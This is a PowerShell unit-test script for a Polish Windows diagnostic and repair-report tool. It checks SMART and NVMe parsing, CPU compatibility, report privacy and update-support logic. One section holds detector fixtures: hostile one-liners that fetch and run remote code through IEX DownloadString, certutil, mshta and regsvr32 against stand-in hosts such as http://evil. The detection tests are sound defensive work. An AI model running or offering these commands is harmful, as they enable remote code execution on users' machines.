# SerwisDiag - testy jednostkowe czystych funkcji, bazy wiedzy i generatora raportow (bez zmian w systemie).
#   powershell -ExecutionPolicy Bypass -File tools\run-tests.ps1
# Kod wyjscia: 0 = wszystko zaliczone, 1 = sa niepowodzenia.
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$SdRoot = Split-Path -Parent $PSScriptRoot
. (Join-Path $SdRoot 'lib\Load.ps1')
$global:SD = New-SdContext -Root $SdRoot

$script:pass = 0; $script:fail = 0
function Assert-That {
    param([string]$Name, $Condition, [string]$Info = '')
    if ($Condition) { $script:pass++ } else { $script:fail++; Write-Host ('[FAIL] ' + $Name + $(if ($Info) { '  -> ' + $Info })) -ForegroundColor Red }
}
function Assert-Equal {
    param([string]$Name, $Actual, $Expected)
    if ("$Actual" -ceq "$Expected") { $script:pass++ } else { $script:fail++; Write-Host ("[FAIL] {0}  -> oczekiwano '{1}', jest '{2}'" -f $Name, $Expected, $Actual) -ForegroundColor Red }
}

# ---------------------------------------------------------------- liczba mnoga
foreach ($case in @(@(0, 'many'), @(1, 'one'), @(2, 'few'), @(4, 'few'), @(5, 'many'), @(12, 'many'), @(14, 'many'), @(21, 'many'), @(22, 'few'), @(112, 'many'), @(1002, 'few'))) {
    Assert-Equal ('Get-SdPlural ' + $case[0]) (Get-SdPlural $case[0] 'one' 'few' 'many') $case[1]
}
Assert-Equal 'Format-Count' (Format-Count 3 'plik' 'pliki' 'plikow') '3 pliki'

# ---------------------------------------------------------------- formatowanie (regresja: 0 -eq '' w PowerShell)
Assert-Equal 'Format-Num 0' (Format-Num 0 0) '0'
Assert-Equal 'Format-Num $null' (Format-Num $null) '-'
Assert-Equal 'Format-Size 0' (Format-Size 0) '0 B'
Assert-Equal 'Format-Size 1536' ((Format-Size 1536 1) -replace [char]0xA0, ' ') '1,5 KB'
Assert-Equal 'Format-Span sekundy' (Format-Span ([timespan]::FromSeconds(44))) '44 s'
Assert-Equal 'Format-Span minuty' (Format-Span ([timespan]::FromSeconds(125))) '2 min 5 s'
Assert-Equal 'Format-Hr' (Format-Hr -2145124300) '0x80240034'
Assert-That 'Test-SdJunkString OEM' (Test-SdJunkString 'To be filled by O.E.M.')
Assert-That 'Test-SdJunkString LENOVO' (-not (Test-SdJunkString 'LENOVO'))
Assert-Equal 'Limit-Text' (Limit-Text 'abcdefghij' 5) ('abcd' + [char]0x2026)

# ---------------------------------------------------------------- heurystyka procesora i zgodnosc z Windows 11
$cpuCases = @(
    @('12th Gen Intel(R) Core(TM) i5-12450HX', $true), @('Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz', $false), @('Intel(R) Core(TM) i7-7820HQ CPU @ 2.90GHz', $false),
    @('Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz', $true), @('Intel(R) Core(TM) i7-1165G7 @ 2.80GHz', $true), @('Intel(R) Core(TM) i3-N305', $true),
    @('Intel(R) Core(TM) i5 CPU 750 @ 2.67GHz', $false), @('Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz', $false), @('Intel(R) Core(TM)2 Duo CPU E8400 @ 3.00GHz', $false),
    @('Intel(R) Celeron(R) CPU N3350 @ 1.10GHz', $false), @('Intel(R) Celeron(R) N4020 CPU @ 1.10GHz', $true), @('Intel(R) Pentium(R) CPU G4560 @ 3.50GHz', $false),
    @('Intel(R) Pentium(R) Gold G5400 CPU @ 3.70GHz', $true), @('Intel(R) Core(TM) Ultra 7 155H', $true), @('Intel(R) Core(TM) i9-13900H', $true),
    @('AMD Ryzen 5 3600 6-Core Processor', $true), @('AMD Ryzen 7 1700 Eight-Core Processor', $false), @('AMD Ryzen 5 PRO 4650U with Radeon Graphics', $true),
    @('AMD Ryzen 7 7840HS w/ Radeon 780M Graphics', $true), @('AMD Ryzen 3 2200G with Radeon Vega Graphics', $true), @('AMD FX(tm)-8350 Eight-Core Processor', $false),
    @('AMD Athlon(tm) II X2 250 Processor', $false), @('Snapdragon (R) X Elite - X1E78100', $true)
)
foreach ($c in $cpuCases) {
    $r = Get-SdCpuInfo $c[0]
    Assert-That ('CPU Win11: ' + $c[0]) ($r.Win11 -eq $c[1]) ("Win11={0} Gen={1}" -f $r.Win11, $r.Gen)
}
Assert-Equal 'CPU rok i5-8250U' (Get-SdCpuInfo 'Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz').Year 2017

# ---------------------------------------------------------------- SMART ATA: parser i ocena
function New-SmartBlock {
    param($Attrs)   # lista @(id, current, worst, raw lub próg)
    $b = New-Object byte[] 512
    $i = 2
    foreach ($a in $Attrs) {
        $b[$i] = [byte]$a[0]; $b[$i + 3] = [byte]$a[1]; $b[$i + 4] = [byte]$a[2]
        $raw = [int64]$a[3]
        for ($k = 0; $k -lt 6; $k++) { $b[$i + 5 + $k] = [byte]($raw -band 0xFF); $raw = $raw -shr 8 }
        $i += 12
    }
    return , $b
}
$dat = New-SmartBlock @(@(5, 100, 100, 0), @(9, 95, 95, 12345), @(194, 60, 50, 40), @(197, 100, 100, 2), @(199, 100, 100, 3), @(187, 100, 100, 0))
$thr = New-Object byte[] 512
$thr[2] = 5; $thr[3] = 36
$attrs = ConvertFrom-SdSmartData -Data $dat -Thresholds $thr
Assert-Equal 'SMART liczba atrybutow' @($attrs).Count 6
Assert-Equal 'SMART godziny (raw)' (@($attrs | Where-Object { $_.Id -eq 9 })[0].Raw) 12345
Assert-Equal 'SMART prog atrybutu 5' (@($attrs | Where-Object { $_.Id -eq 5 })[0].Threshold) 36
$v = Get-SdAtaVerdict -Smart ([pscustomobject]@{ PredictFailure = $false; Attributes = $attrs }) -IsSsd $false
Assert-Equal 'SMART temperatura' $v.Temp 40
Assert-Equal 'SMART godziny' $v.Hours 12345
Assert-That 'SMART pending = crit' (@($v.Issues | Where-Object { $_.Status -eq 'crit' -and $_.Text -match 'oczekujące' }).Count -eq 1)
Assert-That 'SMART CRC = warn' (@($v.Issues | Where-Object { $_.Status -eq 'warn' -and $_.Text -match 'CRC' }).Count -eq 1)
$ssdAttrs = ConvertFrom-SdSmartData -Data (New-SmartBlock @(@(231, 8, 8, 0), @(194, 70, 60, 85))) -Thresholds $null
$v2 = Get-SdAtaVerdict -Smart ([pscustomobject]@{ PredictFailure = $false; Attributes = $ssdAttrs }) -IsSsd $true
Assert-That 'SSD pozostały czas życia 8% = crit' (@($v2.Issues | Where-Object { $_.Status -eq 'crit' -and $_.Text -match 'życia' }).Count -eq 1)
Assert-That 'SSD temperatura 85C = crit' (@($v2.Issues | Where-Object { $_.Status -eq 'crit' -and $_.Text -match 'Temperatura' }).Count -eq 1)
$v3 = Get-SdAtaVerdict -Smart ([pscustomobject]@{ PredictFailure = $true; Attributes = @() }) -IsSsd $false
Assert-That 'PredictFailure = crit' (@($v3.Issues | Where-Object { $_.Status -eq 'crit' }).Count -eq 1)
$bigHours = ConvertFrom-SdSmartData -Data (New-SmartBlock (, @(9, 40, 40, 50000))) -Thresholds $null
$v4 = Get-SdAtaVerdict -Smart ([pscustomobject]@{ PredictFailure = $false; Attributes = $bigHours }) -IsSsd $false
Assert-That 'HDD 50000 h = warn' (@($v4.Issues | Where-Object { $_.Status -eq 'warn' -and $_.Text -match 'godzin' }).Count -eq 1)
# maska 32-bitowa: starsze bajty surowej wartosci nie moga wplywac na licznik sektorow
$hi = ConvertFrom-SdSmartData -Data (New-SmartBlock (, @(5, 100, 100, 0x0100000000L))) -Thresholds $null
$v5 = Get-SdAtaVerdict -Smart ([pscustomobject]@{ PredictFailure = $false; Attributes = $hi }) -IsSsd $false
Assert-Equal 'maska 32-bit: brak problemow' @($v5.Issues).Count 0

# ---------------------------------------------------------------- NVMe
$log = New-Object byte[] 512
$log[0] = 0; [BitConverter]::GetBytes([uint16]323).CopyTo($log, 1); $log[3] = 100; $log[4] = 10; $log[5] = 5
[BitConverter]::GetBytes([uint64]1000000).CopyTo($log, 48); [BitConverter]::GetBytes([uint64]500).CopyTo($log, 128); [BitConverter]::GetBytes([uint64]3).CopyTo($log, 144)
$nv = ConvertFrom-SdNvmeLog $log
Assert-Equal 'NVMe temperatura' $nv.Temperature 50
Assert-Equal 'NVMe zuzycie' $nv.PercentUsed 5
Assert-Equal 'NVMe godziny' $nv.PowerOnHours 500
Assert-That 'NVMe zapisano 512 GB' ([math]::Abs($nv.BytesWritten - 512e9) -lt 1)
Assert-Equal 'NVMe zdrowy = brak problemow' @(Get-SdNvmeVerdict $nv).Count 0
$log[0] = 1; $log[3] = 5; $log[5] = 95; [BitConverter]::GetBytes([uint64]12).CopyTo($log, 160)
$bad = Get-SdNvmeVerdict (ConvertFrom-SdNvmeLog $log)
Assert-That 'NVMe: ostrzezenie krytyczne' (@($bad | Where-Object { $_.Text -match 'Ostrzeżenie krytyczne' }).Count -eq 1)
Assert-That 'NVMe: zuzycie 95%' (@($bad | Where-Object { $_.Text -match 'Zużycie' -and $_.Status -eq 'crit' }).Count -eq 1)
Assert-That 'NVMe: bledy nosnika' (@($bad | Where-Object { $_.Text -match 'nośnika' -and $_.Status -eq 'crit' }).Count -eq 1)

# ---------------------------------------------------------------- baza wiedzy
foreach ($n in 'lifecycle', 'bugchecks', 'pnp-errors', 'pci-vendors', 'software-flags', 'event-hints') {
    Assert-That ("dane/{0} wczytane" -f $n) ($null -ne (Get-SdData $n))
}
$bc = Get-SdBugcheckInfo '0x000000D1'
Assert-Equal 'bugcheck D1' $bc.Name 'DRIVER_IRQL_NOT_LESS_OR_EQUAL'
Assert-Equal 'bugcheck kod' $bc.Code '0x000000D1'
Assert-Equal 'bugcheck C000021A' (Get-SdBugcheckInfo '0xc000021a').Name 'STATUS_SYSTEM_PROCESS_TERMINATED'
Assert-Equal 'bugcheck nieznany' (Get-SdBugcheckInfo '0x12345').Name 'Nieznany kod'
Assert-That 'bugcheck: kazdy wpis ma Cause i Hint' (@((Get-SdData 'bugchecks').GetEnumerator() | Where-Object { -not $_.Value.Cause -or -not $_.Value.Hint -or -not $_.Value.Name }).Count -eq 0)
Assert-That 'pnp-errors: kod 28' ((Get-SdPnpErrorText 28) -match 'nie są zainstalowane')
Assert-Equal 'producent PCI' (Get-SdVendorName 'PCI\VEN_8086&DEV_A0F0&SUBSYS_1234') 'Intel'
Assert-Equal 'producent USB' (Get-SdVendorName 'USB\VID_0BDA&PID_8153') 'Realtek'
$badRx = 0
foreach ($f in (Get-SdData 'software-flags').Flags) { try { [void](New-Object System.Text.RegularExpressions.Regex($f.Pattern)) } catch { $badRx++ } }
Assert-Equal 'software-flags: poprawne wyrazenia regularne' $badRx 0
$lc = Get-SdData 'lifecycle'
$badDates = 0
foreach ($k in $lc.Builds.Keys) { foreach ($d in $lc.Builds[$k].Home, $lc.Builds[$k].Ent) { try { [void][datetime]::ParseExact($d, 'yyyy-MM-dd', [Globalization.CultureInfo]::InvariantCulture) } catch { $badDates++ } } }
Assert-Equal 'lifecycle: poprawne daty' $badDates 0
Assert-That 'event-hints: wpisy maja Sev i Text' (@((Get-SdData 'event-hints').Hints.GetEnumerator() | Where-Object { -not $_.Value.Sev -or -not $_.Value.Text }).Count -eq 0)

# ---------------------------------------------------------------- rejestr testow
$ids = @($global:SdChecks | ForEach-Object { $_.Id })
Assert-Equal 'testy: unikalne Id' ($ids | Select-Object -Unique).Count $ids.Count
$cats = @($global:SdCategories | ForEach-Object { $_.Key })
Assert-That 'testy: kategorie istnieja' (@($global:SdChecks | Where-Object { $cats -notcontains $_.Category }).Count -eq 0)
Assert-That 'testy: poziomy poprawne' (@($global:SdChecks | Where-Object { @('Quick', 'Full', 'Test') -notcontains $_.Level }).Count -eq 0)
Assert-That 'testy: liczba >= 50' ($ids.Count -ge 50) ("jest {0}" -f $ids.Count)

# ---------------------------------------------------------------- heurystyki podejrzanych polecen i sciezek
foreach ($c in @(
        'powershell.exe -NoProfile -WindowStyle Hidden -File "C:\Program Files\Vendor\task.ps1"', 'cmd.exe /c start "" "C:\Program Files\App\app.exe"',
        'wscript.exe "C:\Program Files\App\run.js"', 'C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL')) {
    Assert-That ('legalne polecenie nie jest podejrzane: ' + $c) ($c -notmatch $global:SdSuspiciousCommand)
}
foreach ($c in @(
        'powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x/y'')"',
        'cmd /c certutil -urlcache -f http://x/a.exe a.exe', 'mshta http://evil/x.hta', 'regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll')) {
    Assert-That ('zlosliwe polecenie jest wykryte: ' + $c) ($c -match $global:SdSuspiciousCommand)
}
foreach ($p in 'C:\Users\Jan\AppData\Local\Temp\x.exe', 'C:\Users\Public\Downloads\a.exe', 'C:\ProgramData\foo.exe') { Assert-That ('podejrzana sciezka: ' + $p) ($p -match $global:SdSuspiciousPath) }
foreach ($p in 'C:\Program Files\Intel\SUR\QUEENCREEK\x64\esrv_svc.exe', 'C:\Windows\System32\svchost.exe', 'C:\ProgramData\Intel\SUR\x64\a.exe') { Assert-That ('zwykla sciezka: ' + $p) ($p -notmatch $global:SdSuspiciousPath) }

# ---------------------------------------------------------------- Get-SdEvents: nieistniejacy dostawca nie moze zerowac wyniku
$r = Get-SdEvents -Filter @{ LogName = 'System'; ProviderName = @('NoSuchProvider_A1', 'NoSuchProvider_B2'); StartTime = (Get-Date).AddDays(-1) } -Max 5
Assert-Equal 'Get-SdEvents: brak dostawcy = pusta tablica' @($r).Count 0
Assert-That 'Get-SdEvents: brak ostrzezen w logu' (@($global:SD.Log.ToArray() | Where-Object { $_ -match 'WARN' }).Count -eq 0)
$any = Get-SdEvents -Filter @{ LogName = 'System'; ProviderName = @('NoSuchProvider_A1', 'Service Control Manager'); StartTime = (Get-Date).AddDays(-30) } -Max 3
Assert-That 'Get-SdEvents: istniejacy dostawca obok nieistniejacego nadal zwraca zdarzenia' (@($any).Count -gt 0) 'brak zdarzen SCM w 30 dniach - test nieprzydatny na tej maszynie'

# ---------------------------------------------------------------- funkcje systemowe pomocnicze
$tmp = Join-Path ([IO.Path]::GetTempPath()) ('sdtest-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path (Join-Path $tmp 'a\b') -Force)
[IO.File]::WriteAllBytes((Join-Path $tmp 'x.bin'), (New-Object byte[] 100))
[IO.File]::WriteAllBytes((Join-Path $tmp 'a\y.bin'), (New-Object byte[] 200))
[IO.File]::WriteAllBytes((Join-Path $tmp 'a\b\z.bin'), (New-Object byte[] 300))
$ds = Get-SdDirSize $tmp
Assert-Equal 'Get-SdDirSize bajty' $ds.Bytes 600
Assert-Equal 'Get-SdDirSize pliki' $ds.Files 3
Remove-Item -LiteralPath $tmp -Recurse -Force
$n1 = Invoke-Native -File (Join-Path $env:SystemRoot 'System32\cmd.exe') -Arguments '/c echo hello' -TimeoutSec 20
Assert-That 'Invoke-Native stdout' ($n1.StdOut -match 'hello' -and $n1.ExitCode -eq 0)
$n2 = Invoke-Native -File (Join-Path $env:SystemRoot 'System32\ping.exe') -Arguments '-n 8 127.0.0.1' -TimeoutSec 1
Assert-That 'Invoke-Native limit czasu' ($n2.TimedOut)
$cmd = Join-Path $env:SystemRoot 'System32\cmd.exe'
Assert-Equal 'Resolve-SdCommandPath w cudzyslowie' (Resolve-SdCommandPath ('"' + $cmd + '" /c echo')) $cmd
Assert-Equal 'Resolve-SdCommandPath bez cudzyslowu' (Resolve-SdCommandPath ($cmd + ' /c echo hi')) $cmd
Assert-Equal 'Resolve-SdCommandPath zmienna srodowiskowa' (Resolve-SdCommandPath '%SystemRoot%\System32\cmd.exe /c') $cmd
$fw = Get-SdFirmwareType
Assert-That 'Get-SdFirmwareType' (@('UEFI', 'BIOS', 'nieznany') -contains $fw) $fw
$pdh = New-SdPdh
Assert-That 'PDH dostepne' ($null -ne $pdh)
if ($pdh) { $ix = $pdh.Add('\Processor(_Total)\% Processor Time'); Assert-That 'PDH licznik CPU' ($ix -ge 0); [void]$pdh.Collect(); Start-Sleep -Milliseconds 1000; [void]$pdh.Collect(); $val = $pdh.Get($ix); Assert-That 'PDH wartosc 0-100' ($val -ge 0 -and $val -le 100) "$val"; $pdh.Dispose() }
$w = Get-SdWinInfo
Assert-That 'Get-SdWinInfo build' ($w.Build -ge 9200) ([string]$w.Build)

# ---------------------------------------------------------------- raporty: prywatnosc, ucieczka HTML, brak zmiennych CSS
$global:SD = New-SdContext -Root $SdRoot -Level Quick
$global:SD.Cur.Category = 'system'; $global:SD.Cur.Id = 't.1'
Set-SdMeta 'ComputerName' 'TESTPC'; Set-SdMeta 'Model' 'Model X'; Set-SdMeta 'Serial' 'SECRET-SERIAL-123'
Add-Finding 'Numer seryjny' -Status info -Value 'SECRET-SERIAL-123' -Private
Add-Finding 'Test krytyczny <script>alert(1)</script>' -Status crit -Value 'Wartosc & "cudzyslow"' -Details 'Szczegoly' -Advice 'Zrob <b>cos</b>'
Add-Finding 'Test OK' -Status ok -Value 'dobrze'
Add-Table 'Tabela jawna' -Rows @([pscustomobject]@{ A = 1; B = 'x' })
Add-Table 'Tabela prywatna' -Rows @([pscustomobject]@{ Konto = 'sekret' }) -Private
$global:SD.Started = Get-Date; $global:SD.Finished = Get-Date
$res = Get-SdResult
$tech = New-SdHtmlReport -Result $res -Mode Technical -Settings @{ ShopName = 'Serwis <Test>' }
$cust = New-SdHtmlReport -Result $res -Mode Customer -Settings @{ ShopName = 'Serwis <Test>' }
Assert-That 'raport techniczny zawiera dane prywatne' ($tech -match 'SECRET-SERIAL-123')
Assert-That 'raport klienta NIE zawiera danych prywatnych' ($cust -notmatch 'SECRET-SERIAL-123' -and $cust -notmatch 'sekret')
Assert-That 'raport klienta bez tabeli prywatnej' ($tech -match 'Tabela prywatna' -and $cust -notmatch 'Tabela prywatna')
Assert-That 'HTML: znaki specjalne zakodowane' ($tech -notmatch '<script>alert' -and $tech -match '&lt;script&gt;')
Assert-That 'HTML: nazwa serwisu zakodowana' ($tech -notmatch 'Serwis <Test>' -and $tech -match 'Serwis &lt;Test&gt;')
Assert-That 'HTML: brak var(--) (kompatybilnosc z IE11)' ($tech -notmatch 'var\(--' -and $cust -notmatch 'var\(--')
Assert-Equal 'werdykt krytyczny' $res.Verdict.Level 'crit'
$txt = New-SdTextReport -Result $res
Assert-That 'TXT bez danych prywatnych' ($txt -notmatch 'SECRET')
$json = ConvertTo-SdJsonReport -Result $res
Assert-That 'JSON poprawny' (($json | ConvertFrom-Json).findings.Count -ge 2)
Assert-That 'JSON (bez -IncludePrivate) bez numeru seryjnego' ($json -notmatch 'SECRET')

# ---------------------------------------------------------------- ustawienia
$sroot = Join-Path ([IO.Path]::GetTempPath()) ('sdset-' + [guid]::NewGuid().ToString('N'))
$s = Get-SdDefaultSettings; $s.ShopName = 'Zażółć gęślą jaźń'; $s.Technician = 'Jan'
Save-SdSettings -Root $sroot -Settings $s
$s2 = Get-SdSettings $sroot
Assert-Equal 'ustawienia: polskie znaki' $s2.ShopName 'Zażółć gęślą jaźń'
Assert-Equal 'ustawienia: technik' $s2.Technician 'Jan'
Remove-Item -LiteralPath $sroot -Recurse -Force
$sroot2 = Join-Path ([IO.Path]::GetTempPath()) ('sdset-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path (Join-Path $sroot2 'config') -Force)
[IO.File]::WriteAllText((Join-Path $sroot2 'config\settings.json'), '{"OpenAfterScan":"zawsze","OpenReport":true}')
Assert-Equal 'ustawienia: niepoprawne OpenAfterScan -> none' (Get-SdSettings $sroot2).OpenAfterScan 'none'
Assert-Equal 'ustawienia: domyslnie raport sie nie otwiera' (Get-SdDefaultSettings).OpenAfterScan 'none'
Remove-Item -LiteralPath $sroot2 -Recurse -Force

# ---------------------------------------------------------------- zdarzenia dyskowe: przypisanie do nosnika
$global:SD = New-SdContext -Root $SdRoot
$disksMock = @(
    [pscustomobject]@{ Index = 0; Model = 'Samsung SSD 980'; Bus = 'NVMe'; Iface = 'SCSI'; Media = 'SSD'; Pnp = 'SCSI\DISK&VEN_NVME'; Health = ''; WmiStatus = ''; Operational = '' }
    [pscustomobject]@{ Index = 1; Model = 'ASMT 2115'; Bus = 'USB'; Iface = 'USB'; Media = 'HDD'; Pnp = 'USBSTOR\DISK'; Health = ''; WmiStatus = ''; Operational = '' }
)
$mapsMock = [pscustomobject]@{ DevToDisk = @{ '\Device\HarddiskVolume3' = 0 }; DevToLetter = @{ '\Device\HarddiskVolume3' = 'C:' }; LetterToDisk = @{ 'C:' = 0 } }
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @('\Device\Harddisk0\DR0') -Data @{} -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'dysk: wewnetrzny' $t.Kind 'internal'
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @('\Device\Harddisk1\DR9') -Data @{} -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'dysk: USB podlaczony' $t.Kind 'external'
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @('\Device\Harddisk4\DR12') -Data @{} -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'dysk: nosnik odlaczony' $t.Kind 'absent'
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @('D:') -Data @{ VolumeId = 'D:'; DeviceName = '\Device\HarddiskVolume13'; BusType = '7'; VendorId = 'ASMT'; ProductId = '2115' } -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'NTFS 140: wolumin odlaczonego dysku USB' $t.Kind 'absent'
Assert-That 'NTFS 140: opis z modelem i USB' ($t.Label -match 'ASMT 2115' -and $t.Label -match 'USB') $t.Label
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @() -Data @{ DeviceName = '\Device\HarddiskVolume3' } -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'NTFS: wolumin systemowy -> dysk 0' $t.Kind 'internal'
$t = Resolve-SdDiskEventTarget -Ref (Get-SdDiskEventRef -Props @('\Device\RaidPort0') -Data @{} -Message '') -Disks $disksMock -Maps $mapsMock
Assert-Equal 'reset kontrolera' $t.Kind 'controller'
Assert-Equal 'ocena: dysk komputera krytyczny' (Get-SdDiskEventStatus -Kind internal -HintSeverity crit) 'crit'
Assert-Equal 'ocena: dysk USB co najwyzej warn' (Get-SdDiskEventStatus -Kind external -HintSeverity crit) 'warn'
Assert-Equal 'ocena: odlaczony nosnik = info' (Get-SdDiskEventStatus -Kind absent -HintSeverity crit) 'info'
Assert-That 'event-hints: 129 tylko dla sterownikow pamieci' (-not (Get-SdEventHint 'Microsoft-Windows-Hyper-V-Hypervisor' 129) -and (Get-SdEventHint 'stornvme' 129))
$wd = Join-Path ([IO.Path]::GetTempPath()) ('sdwer-' + [guid]::NewGuid().ToString('N'))
[void](New-Item -ItemType Directory -Path $wd)
$ft = (New-Object DateTime(2026, 4, 5, 20, 56, 0, [DateTimeKind]::Local)).ToFileTimeUtc()
[IO.File]::WriteAllText((Join-Path $wd 'Report.wer'), ("Version=1`r`nEventType=LiveKernelEvent`r`nEventTime=$ft`r`n"), [Text.Encoding]::Unicode)
Assert-Equal 'WER: czas awarii z Report.wer' ((Get-SdWerEventTime (Get-Item $wd)).ToString('yyyy-MM-dd HH:mm')) '2026-04-05 20:56'
Remove-Item -LiteralPath (Join-Path $wd 'Report.wer')
Assert-That 'WER: bez Report.wer - data utworzenia folderu' ((Get-SdWerEventTime (Get-Item $wd)) -eq (Get-Item $wd).CreationTime)
Remove-Item -LiteralPath $wd -Recurse -Force

# ---------------------------------------------------------------- aktualizacje: daty, poprawki systemu, ESU
$src = New-Object DateTime(2026, 10, 17, 18, 38, 0)
Assert-Equal 'WU: UTC -> czas lokalny' ((ConvertTo-SdLocalTime $src).ToString('yyyy-MM-dd HH:mm')) ((New-Object DateTime(2026, 10, 17, 18, 38, 0, [DateTimeKind]::Utc)).ToLocalTime().ToString('yyyy-MM-dd HH:mm'))
Assert-Equal 'QFE: M/d/yyyy' ((ConvertFrom-SdQfeDate '10/14/2025').ToString('yyyy-MM-dd')) '2025-10-14'
Assert-Equal 'QFE: DateTime' ((ConvertFrom-SdQfeDate (New-Object DateTime(2026, 1, 2))).ToString('yyyy-MM-dd')) '2026-01-02'
Assert-Equal 'QFE: FILETIME szesnastkowo' ((ConvertFrom-SdQfeDate ((New-Object DateTime(2015, 3, 4, 12, 0, 0)).ToFileTime().ToString('x16'))).ToString('yyyy-MM-dd')) '2015-03-04'
Assert-That 'QFE: pusty / smieci = brak daty' ($null -eq (ConvertFrom-SdQfeDate '') -and $null -eq (ConvertFrom-SdQfeDate 'abc'))
foreach ($tt in @('2026-10 Aktualizacja zabezpieczeń (KB5127648) (26300.9711)', '2025-10 Cumulative Update for Windows 10 Version 22H2 for x64-based Systems (KB5066791)',
        '2026-10 Aktualizacja zabezpieczeń .NET Framework w wersji (KB5127694)', '2023-01 Security Monthly Quality Rollup for Windows 8.1 for x64-based Systems (KB5022352)')) {
    Assert-That ('poprawka systemu: ' + $tt) (Test-SdOsPatchTitle $tt)
}
foreach ($tt in @('Aktualizacja analizy zabezpieczeń dla Microsoft Defender Antivirus — KB2267602 (Wersja 1.461.145.0)', 'Narzędzie Windows do usuwania złośliwego oprogramowania dla komputerów z procesorem x64 — v5.146 (KB890830)',
        '9NRZT3Q9R3DL-Microsoft.WindowsAppRuntime.2', 'Lenovo System Driver Update (26.8.0.29)', 'Security Update for Microsoft Office 2016 (KB5002700) 64-Bit Edition', 'Update for Windows Security platform - KB5007651 (Version 1.0.2306.10002)')) {
    Assert-That ('to nie poprawka systemu: ' + $tt) (-not (Test-SdOsPatchTitle $tt))
}
$today = New-Object DateTime(2026, 10, 22)
$w10End = New-Object DateTime(2025, 10, 14)
$mkEsu = { param($Year, $LicUntil, $Code, $ConsUntil, $After) [pscustomobject]@{ Applies = $true; LicenseYear = $Year; LicenseUntil = $LicUntil; ConsumerCode = $Code; ConsumerUntil = $ConsUntil; UbrAfterEos = $After; LastFreeUbr = 6456; Ubr = $(if ($After) { 7000 } else { 6456 }) } }
$r = Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'Windows 10 22H2' -Esu (& $mkEsu 0 $null 2 $null $false) -LastPatch (New-Object DateTime(2025, 10, 15))
Assert-Equal 'Win10 bez ESU: krytyczne' $r.Status 'crit'
Assert-That 'Win10 bez ESU: brak poprawek, rada o ESU, stan programu' ((-not $r.Covered) -and $r.Advice -match 'ESU' -and $r.Value -match 'kwalifikuje') $r.Value
$r = Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'Windows 10 22H2' -Esu (& $mkEsu 0 $null 3 (New-Object DateTime(2027, 10, 12)) $true) -LastPatch (New-Object DateTime(2026, 10, 15))
Assert-Equal 'Win10 + ESU konsumenckie: info' $r.Status 'info'
Assert-That 'Win10 + ESU: objety do 2027-10-12' ($r.Covered -and $r.Value -match '2027-10-12') $r.Value
Assert-Equal 'ESU zapisane, brak poprawek ESU: warn' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu (& $mkEsu 0 $null 5 (New-Object DateTime(2027, 10, 12)) $false) -LastPatch (New-Object DateTime(2025, 10, 15))).Status 'warn'
Assert-Equal 'ESU, ale brak poprawek od 90 dni: warn' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu (& $mkEsu 0 $null 3 (New-Object DateTime(2027, 10, 12)) $true) -LastPatch $today.AddDays(-90)).Status 'warn'
$y1 = & $mkEsu 1 (New-Object DateTime(2026, 10, 13)) $null $null $true
Assert-Equal 'licencja ESU rok 1 wygasla, swieza poprawka: warn' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu $y1 -LastPatch (New-Object DateTime(2026, 10, 14))).Status 'warn'
Assert-Equal 'licencja ESU rok 1 wygasla dawno: krytyczne' (Resolve-SdSupportStatus -EndDate $w10End -Today (New-Object DateTime(2026, 12, 20)) -Build 19045 -VerName 'W10' -Esu $y1 -LastPatch (New-Object DateTime(2026, 10, 14))).Status 'crit'
Assert-Equal 'licencja ESU rok 2: info' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu (& $mkEsu 2 (New-Object DateTime(2027, 10, 12)) $null $null $true) -LastPatch $today.AddDays(-8)).Status 'info'
Assert-Equal 'poprawki ESU bez danych o programie: info' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu (& $mkEsu 0 $null $null $null $true) -LastPatch $today.AddDays(-7)).Status 'info'
Assert-Equal 'poprawki ESU, ale dawno: warn' (Resolve-SdSupportStatus -EndDate $w10End -Today $today -Build 19045 -VerName 'W10' -Esu (& $mkEsu 0 $null $null $null $true) -LastPatch $today.AddDays(-140)).Status 'warn'
Assert-Equal 'Win11 26H2 wspierany: ok' (Resolve-SdSupportStatus -EndDate (New-Object DateTime(2028, 10, 10)) -Today $today -Build 26300 -VerName 'W11').Status 'ok'
Assert-Equal 'koniec wsparcia za 90 dni: warn' (Resolve-SdSupportStatus -EndDate $today.AddDays(90) -Today $today -Build 26100 -VerName 'W11').Status 'warn'
Assert-Equal 'Windows 8.1: krytyczne' (Resolve-SdSupportStatus -EndDate (New-Object DateTime(2023, 1, 10)) -Today $today -Build 9600 -VerName 'W8.1').Status 'crit'
Assert-Equal 'Win11 po koncu wsparcia < 180 dni: warn' (Resolve-SdSupportStatus -EndDate $today.AddDays(-30) -Today $today -Build 22631 -VerName 'W11 23H2').Status 'warn'
